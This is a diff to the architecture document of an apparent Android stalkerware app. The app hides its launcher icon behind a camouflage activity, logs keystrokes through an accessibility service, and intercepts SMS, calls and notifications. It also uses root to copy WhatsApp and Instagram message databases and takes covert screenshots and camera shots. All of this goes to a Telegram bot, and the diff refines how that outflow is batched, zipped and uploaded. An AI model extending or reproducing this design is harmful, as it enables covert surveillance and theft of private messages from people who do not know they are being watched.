@@ -55,10 +55,11 @@ app/src/main/java/com/system/superiormonitor/
 │   ├── CaptureHelper.kt        # Unified root capture engine (screencap & camera)
 │   ├── Diagnostics.kt          # LogManager & TelemetryCollector
 │   ├── NetworkRecoveryManager.kt # Connectivity monitoring & recovery sequencing
+│   ├── NotificationListener.kt # Advanced notification interception, media parsing & filtering
 │   ├── SystemManager.kt        # OS permission checks & launcher visibility
 │   ├── SystemReceivers.kt      # Broadcast receivers (Boot, Dialer, DeviceAdmin, AppInstall)
-│   ├── SystemServices.kt       # AccessibilityService (keylogger) & NotificationListener
-│   └── UtilityActivities.kt    # PopupActivity & CamouflageActivity
+│   ├── SystemServices.kt       # AccessibilityService (keylogger)
+│   └── UtilityActivities.kt    # BatchManager, ZipManager, PopupActivity & CamouflageActivity
 ├── monitor/                    # Background data extraction & subsystems
 │   ├── CallMonitor.kt          # Telephony event interception
 │   ├── SmsMonitor.kt           # SMS interception (incoming + outgoing)
@@ -97,12 +98,12 @@ Handles all real-time communication between the device and the Telegram Bot API.
 
 | File | Responsibility |
 |:---|:---|
-| **`BotService.kt`** | **The Lifecycle Manager** — Foreground service managing the Telegram polling loop, monitor initialization, and the live text batching engine. Uses `ConcurrentHashMap`-based message buffers, per-source `throttleJobs`, and a global `sendMutex` to debounce, serialize, and batch all outbound notifications. Uses a generic `handleMonitorToggle()` function and a Kotlin `when` tree for `onStartCommand` intent routing. |
+| **`BotService.kt`** | **The Lifecycle Manager** — Foreground service managing the Telegram polling loop and monitor initialization. Delegates all debounce and queueing to `BatchManager`. Uses a generic `handleMonitorToggle()` function and a Kotlin `when` tree for `onStartCommand` intent routing (e.g. instantly delegating snapshot intents to `SnapshotWorker` to prevent ANRs). |
 | **`BotCommands.kt`** | **The Router** — Parses raw Telegram updates and routes commands/callbacks. Silently drops non-command media to keep the chat clean. Fully decoupled from string building. |
 | **`BotActions.kt`** | **The Controller** — Single source of truth for actions and side-effects. Centralizes authorization/security (`handleUnauthorizedAccess()`), remote popups, and device control. |
-| **`OfflineManager.kt`**| **The Synchronization Engine** — Path-based categorical sync pipeline handling text logs, resilient ZIP compression for snapshots (batches if > 3), and rate-limit safe sequential syncing for audio. Uses a private `queueOnlyInternal()` method for DRY file-write operations. |
-| **`MediaUploader.kt`** | **The Upload Gateway** — Universal API for `uploadDocument`, `uploadDocumentUri`, and `uploadPhoto` requests. Automatically routes failed media to `OfflineManager` via `moveToOfflineQueue()` when a `fallbackOfflineSubdir` is provided. Also handles legacy intent-based uploads for snapshots, call recordings, and key events. |
-| **`BotMessages.kt`** | **The View / Text Dictionary** — Single source of truth for all text. Uses `buildMenuHeader()` templates for consistent menu formatting, `buildSocialUpdateMessage()` for WhatsApp/Instagram messages, `buildOfflineSyncCaption()` for unified offline labels, and `formatFeatureState()` for standardized UI status strings. |
+| **`OfflineManager.kt`**| **The Synchronization Engine** — Path-based categorical sync pipeline handling text logs, offline media discovery (`whatsapp/offline/media`), and rate-limit safe sequential syncing for audio. Evaluates media queues and intelligently groups files into Albums or ZIPs via `ZipManager`. |
+| **`MediaUploader.kt`** | **The Upload Gateway** — Universal API for `uploadDocument`, `uploadDocumentUri`, `uploadPhoto`, and `uploadMediaGroup` requests. Automatically routes failed media to `OfflineManager` using robust cross-mount `copyTo` fallback. Also handles legacy intent-based uploads. |
+| **`BotMessages.kt`** | **The View / Text Dictionary** — Single source of truth for all text. Uses `buildMenuHeader()`, `buildBulkUploadMessage()` (dynamic direction formatting), and `buildOfflineSyncCaption()`. Includes custom formatting for native Album headers. |
 | **`BotMarkups.kt`** | **The View / UI Structure** — Single source of truth for all Telegram Inline Keyboards. Uses a type-safe `inlineKeyboard { row { button() } }` Kotlin DSL built on `org.json.JSONObject` to guarantee JSON syntax validity. |
 | **`TelegramApi.kt`** | **Networking Singleton** — Uses `OkHttpClient` for all Telegram API requests. Contains API reachability validation, `escapeMarkdown()` for safe string interpolation, and file upload logic. |
 
@@ -117,10 +118,11 @@ Infrastructure layer providing OS-level hooks, diagnostics, broadcast handling, 
 | **`CaptureHelper.kt`** | **Root Capture Engine** — Unified execution layer for root-based screencap (`screencap -p`) and camera captures (`CameraManager`). Extracted from formerly duplicated logic in `MediaOperations.kt` and `SnapshotEngine.kt`. Enforces lock screen rules: on-demand screenshots and scheduled captures fail on locked screens; on-demand cameras bypass the lock screen. |
 | **`Diagnostics.kt`** | **Logging & Telemetry** — Contains `LogManager` (centralized logging utility using `StateFlow` to push categorized real-time logs to the Compose UI, with automatic error mirroring) and `TelemetryCollector` (gathers live system metrics asynchronously: CPU frequency, thermal zones, cellular signal strength, battery, storage, and carrier info via root commands). |
 | **`NetworkRecoveryManager.kt`** | **Network Recovery** — Monitors connectivity via `ConnectivityManager.NetworkCallback`. Upon network restoration, waits 5 seconds for DNS/socket stabilization, validates Telegram API health, sends a connection-restored notification with telemetry, and triggers the full offline queue sync pipeline. |
+| **`NotificationListener.kt`**| **Notification Interceptor** — Native `MonitorNotificationListenerService`. Features Memory-Safe Image Extraction (`EXTRA_PICTURE`), `MessagingStyle` array parsing for perfect chat logs, and Dynamic Bot Blacklist via `ForceReply` filtering. |
 | **`SystemManager.kt`** | **OS Permissions & Launcher** — Encapsulates all permission state queries (root, Device Admin, Accessibility, Notification Listener, camera, SMS, contacts, etc.) and controls launcher icon visibility with camouflage activity fallback. |
-| **`SystemReceivers.kt`** | **Broadcast Receivers** — Contains `BootReceiver` (restarts `BotService` on `ACTION_BOOT_COMPLETED`), `DialerCodeReceiver` (secret dialer code `*#*#677#*#*` to unhide the app), `MonitorDeviceAdminReceiver` (Device Administrator), and `AppInstallReceiver` (dynamically registered by `BotService` for fresh install/removal alerts, with update filtering via `Intent.EXTRA_REPLACING`). |
-| **`SystemServices.kt`** | **Accessibility & Notifications** — Contains `MonitorAccessibilityService` (key event interception via `AccessibilityEvent`, batches keystrokes per-app and flushes to offline text files on screen-off or app switch) and `MonitorNotificationListenerService` (connected listener for future notification processing). |
-| **`UtilityActivities.kt`** | **Utility Activities** — Contains `PopupActivity` (transparent activity for remote popup messages from Telegram) and `CamouflageActivity` (disguised entry point that redirects to Wi-Fi settings). |
+| **`SystemReceivers.kt`** | **Broadcast Receivers** — Contains `BootReceiver`, `DialerCodeReceiver`, `MonitorDeviceAdminReceiver`, and `AppInstallReceiver` (uses background Coroutines for IPC package resolution to prevent main-thread ANRs). |
+| **`SystemServices.kt`** | **Accessibility** — Contains `MonitorAccessibilityService` (key event interception via `AccessibilityEvent`, batches keystrokes per-app and flushes to offline files via asynchronous background Coroutines to prevent UI stutters). |
+| **`UtilityActivities.kt`** | **Utility & Core Managers** — Contains `BatchManager` (centralized concurrent queue engine with Mutex locks), `ZipManager` (unified archival and MIME-type categorization for offline media), `PopupActivity`, and `CamouflageActivity`. |
 
 ---
 
@@ -132,12 +134,12 @@ Responsible for gathering telemetry, media, and intercepting device events. All 
 |:---|:---|
 | **`CallMonitor.kt`** | Hooks into the Android Telephony framework to capture call events. Uses `OfflineManager.sendOrQueue()` for offline resilience and `BotMessages` for strings. |
 | **`SmsMonitor.kt`** | Monitors incoming/outgoing SMS traffic. Captures messages with debounce + mutex locking, delegating offline handling to `OfflineManager`. |
-| **`WhatsAppMonitor.kt`** | Uses root (`su`) to continuously poll `msgstore.db` via `stat`. Serves both WhatsApp and WhatsApp Business through the `WhatsAppVariant` enum (`NORMAL`/`BUSINESS`), which parameterizes the package name, log tag, directory name, and SharedPreferences keys. Uses `context.filesDir` as the temporary database workspace to bypass Android's FUSE filesystem isolation. Performs `chown` after root-copy for safe SQLite `OPEN_READWRITE` WAL recovery. Supports both modern (`jid_map` with LID resolution) and legacy SQL query schemas with automatic fallback. |
+| **`WhatsAppMonitor.kt`** | Uses root (`su`) to poll `msgstore.db` (and `wa.db`). Features dynamic path resolution for media extraction. Uses `context.filesDir` as workspace to bypass FUSE. Includes robust fallback to `OPEN_READONLY` SQLite access if root `666` permissions fail. Supports both modern and legacy SQL schemas. |
 | **`InstagramMonitor.kt`** | Polls `direct.db` via `stat` (standard SQLite), dynamically handles JSON BLOB parsing, extracts usernames, deduplicates via timestamp baselining, and routes to offline queues. Uses `context.filesDir` workspace and `chown` for WAL recovery, matching WhatsApp's bypass pattern. |
 | **`KeyEvents.kt`** | Orchestrates scheduled Key Events uploads using `AlarmManager` with automatic fallback to inexact alarms. |
-| **`MediaOperations.kt`** | Handles on-demand media captures (screenshot, front/rear camera) and duration-based mic recordings. Delegates root capture execution to `CaptureHelper`. Uses `MediaUploader` for all uploads with offline fallback. |
+| **`MediaOperations.kt`** | Handles on-demand media captures (screenshot, front/rear camera) and duration-based mic recordings. Delegates root capture execution to `CaptureHelper`. Uses `MediaUploader` for all uploads with robust offline routing. |
 | **`FetchOperations.kt`** | Handles on-demand asynchronous retrieval of device contacts and full call activity history. Generates flat-file backups and queues to `OfflineManager` via `MediaUploader` if disconnected. |
-| **`SnapshotEngine.kt`** | Orchestrates scheduled snapshots using `AlarmManager` with `setExactAndAllowWhileIdle()` and automatic fallback to inexact alarms on Android 14+. Contains the `SnapshotScheduler` class for scheduling management. Delegates root capture execution to `CaptureHelper`. |
+| **`SnapshotEngine.kt`** | Orchestrates scheduled snapshots using `AlarmManager`. Contains `SnapshotScheduler`. Delegates root capture execution to `SnapshotWorker` (via `BotService` routing) running in background IO coroutines to completely eliminate 10-second ANR limits. |
 | **`NetworkEnforcer.kt`** | Persistent network enforcement module. Evaluates connectivity state on boot and monitors for changes. Re-enables Wi-Fi, Mobile Data, or Hotspot via root commands and Java Proxy Reflection into `TetheringManager`. Includes built-in fail-safes that auto-disable failing toggles. |
 
 > [!WARNING]
@@ -166,7 +168,7 @@ Provides a modern, visually cohesive UI using Jetpack Compose and Material 3.
 
 | File | Responsibility |
 |:---|:---|
-| **`PrefsManager.kt`** | Centralized `SharedPreferences` manager using Kotlin property delegates (`StringPref`, `BooleanPref`) for clean, type-safe configuration persistence. |
+| **`PrefsManager.kt`** | Centralized `SharedPreferences` manager using Kotlin property delegates. Pre-warmed asynchronously in the Application class (`SuperiorMonitorApp.kt`) to bypass initial Main Thread Keystore decryption penalties and eliminate ANRs. |
 | **`TelegramModels.kt`** | Kotlin data classes representing the Telegram Bot API schema (`UpdateResponse`, `Message`, `CallbackQuery`, etc.). |
 
 ---
@@ -179,25 +181,25 @@ Provides a modern, visually cohesive UI using Jetpack Compose and Material 3.
 
 ---
 
-## 4. Live Text Batching Mechanism
+## 4. Live Text & Media Batching Mechanism
 
-All real-time text notifications (WhatsApp, WA Business, Instagram, Calls, SMS) are routed through a centralized flood-protection system inside `BotService.kt` before being sent to Telegram.
+All real-time telemetry (text, notifications, and media bursts) is routed through unified, centralized queueing systems in `UtilityActivities.kt` before being dispatched to Telegram. This guarantees strict DRY compliance and thread-safe serial uploads.
 
 | Component | Role |
 |:---|:---|
-| **`messageBuffers`** | `ConcurrentHashMap<String, MutableList<Pair<String, String?>>>` — Stores incoming messages per source, preserving both the text and its original `parseMode` (markdown formatting). |
-| **`throttleJobs`** | `ConcurrentHashMap<String, Job>` — Maintains per-source coroutine timers for the 3-second debounce window. |
-| **`sendMutex`** | Global `Mutex` — Serializes all outbound Telegram API calls across monitors, preventing concurrent HTTP conflicts. |
+| **`BatchManager`** | The central concurrent queue engine. Uses Coroutines, `ConcurrentHashMap`, and `Mutex` locks to debounce text/notifications (3-second window) and media (8-second window) across all live monitors. |
+| **`ZipManager`** | Unified compression engine. Intelligently sorts both live media bursts and offline accumulations by precise MIME type (Images, Videos, Audio, Documents) to prevent Telegram API grouping crashes. Contains `Mutex` locks to safely serialize directory access. |
 
-### Batching Logic
+### Batching & Categorization Logic
 
-1. When the **first message** from a source arrives, a 3-second timer starts.
-2. Subsequent messages from the same source within the window are silently buffered.
-3. When the timer elapses, the buffer is evaluated:
-   - **1–3 messages**: Sent individually with 1-second delays, preserving `parseMode` for correct markdown rendering.
-   - **4+ messages**: Bundled into a `.txt` document (e.g., `whatsapp_bulk.txt`) and uploaded as a single file.
-4. **Safety cap (25 messages)**: If the buffer hits 25 entries, it flushes immediately regardless of the timer, preventing RAM pressure.
-5. **Failure fallback**: Any failed send (individual or bulk) is routed to `OfflineManager.queueOnly()` for later sync.
+1. **Text & Notifications**: A 3-second debounce window groups rapid text events.
+   - **1–2 messages**: Sent individually, preserving `parseMode` markdown.
+   - **3+ messages**: Compiled into a `.txt` bulk document (e.g., `📦 Live Batch Upload`) and sent as a single file.
+2. **Media Extraction (WhatsApp/Instagram)**: An 8-second debounce window natively batches media bursts.
+   - Files are pre-sorted categorically (Images, Videos, Audio, Documents).
+   - **2-3 visual files**: Uploaded seamlessly as a native Telegram Album (`MediaGroup`) containing perfect header context inherited from the first message.
+   - **>3 visual files (or any large documents)**: Compressed into dedicated ZIP archives via `ZipManager`.
+3. **Mutex Serialization**: `BatchManager` guarantees that live sweeps never overlap with `OfflineManager` periodic syncs, totally eliminating race conditions and duplicate uploads.
 
 ---
 
